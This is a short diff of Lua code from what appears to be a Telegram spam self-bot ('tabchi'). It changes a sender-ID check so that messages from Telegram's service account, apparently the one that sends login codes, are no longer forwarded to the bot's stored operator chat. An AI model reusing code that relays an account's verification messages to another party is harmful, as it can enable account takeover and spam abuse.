@@ -204,7 +204,7 @@ function proc_pv(msg)
   end
 end
     proc_pv(msg)
-    if msg.sender_user_id_ == 777000 then
+    if msg.sender_user_id_ == 000 then
       tdcli_function({
         ID = "ForwardMessages",
         chat_id_ = tonumber(redis:get("tabchi:" .. tabchi_id .. ":fullsudo")),
